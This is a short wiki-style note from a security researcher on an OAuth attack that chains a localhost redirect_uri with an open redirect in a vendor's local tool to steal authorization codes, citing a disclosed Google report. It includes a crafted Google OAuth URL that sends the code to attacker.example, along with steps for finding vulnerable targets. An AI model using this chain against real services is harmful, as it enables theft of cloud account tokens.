---
title: OAuth localhost redirect_uri chained with open-redirect
slug: localhost-redirect-open-redirect-chain
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/oauth, technique/redirect-uri, technique/open-redirect]
inbound: []
---

# OAuth localhost redirect_uri chained with open-redirect

## Pattern
Many OAuth clients (especially desktop CLIs, "cloud tools" launchers) are
configured with `redirect_uri = http://localhost:PORT/...` so the user's
local app can receive the auth code. Provider considers this safe — "if
the attacker controls localhost they already own the box."

But if **another product from the same vendor** ships listening on the
same localhost port and exposes an **open redirect**, the chain is:

1. Victim visits `https://attacker/start-oauth`.
2. Attacker initiates OAuth flow with `redirect_uri=http://localhost:8080/...`
   plus an open-redirect-bearing path on the vendor's local tool.
3. Local tool receives auth-code redirect → its open redirect bounces to
   attacker domain → attacker captures the code.

Mr. Mossuker landed this against Google (Cloud Tools for Eclipse) for
full GCP token theft.

## Preconditions
- Provider OAuth config allows `localhost` redirect URIs (or any port on
  localhost).
- Vendor ships another *trusted* product that:
  - Binds to a known/discoverable localhost port.
  - Contains an open redirect on a path attacker can craft.
- Victim has the trusted vendor product running while clicking the OAuth
  link.

## Detection
- Enumerate vendor's `redirect_uris_supported` via `/.well-known/openid-
  configuration` — look for `localhost`.
- Inventory the vendor's first-party desktop tools; map default ports they
  bind.
- Test each for open redirects.

## Triggering
```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=CLIENT&
  response_type=code&
  scope=...&
  redirect_uri=http://localhost:8080/oauth/callback%3Fopen_redirect%3Dhttps://attacker.example
```
(URL-encoded inner open-redirect param; the local tool follows it on receipt
of the code.)

## Related
- [[localhost-redirect-mobile-sibling-app]] — same primitive on Android.
- [[redirect-uri-bypass]] — general redirect_uri abuse class.

## Seen in the wild
- {date: 2024, source: CT Ep 116} — Google Cloud Tools for Eclipse, full
  GCP-token leak.

## References
- Google VRP disclosed report — Mr. Mossuker
- Critical Thinking Podcast Ep 116
